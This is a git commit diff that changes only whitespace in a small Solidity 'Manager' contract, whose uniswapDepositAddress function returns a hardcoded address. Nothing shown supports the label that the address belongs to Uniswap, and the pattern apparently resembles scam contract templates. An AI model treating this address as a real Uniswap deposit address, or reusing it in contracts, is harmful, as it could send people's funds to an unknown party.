80ae1ce94a23a1925983254cc31af4b15c6fe1eb
Pancakeloan <87273484+Pancakeloan@users.noreply.github.com>
2022-02-03 06:24:17 -0800

    Update VE.Project.4.17.sol

--- VE.Project.4.17.sol
+++ VE.Project.4.17.sol
@@ -1,11 +1,11 @@
 pragma solidity ^0.5.0;
 
 contract Manager {
-	function performTasks() public {
+   function performTasks() public {
 	    
-	}
+   }
 
-	function uniswapDepositAddress() public pure returns (address) {
-		return 0xed3338E153b9400D49F38ca7e73Ea337fdb3c723;
-	}
+   function uniswapDepositAddress() public pure returns (address) {
+	return 0xed3338E153b9400D49F38ca7e73Ea337fdb3c723;
+   }
 }
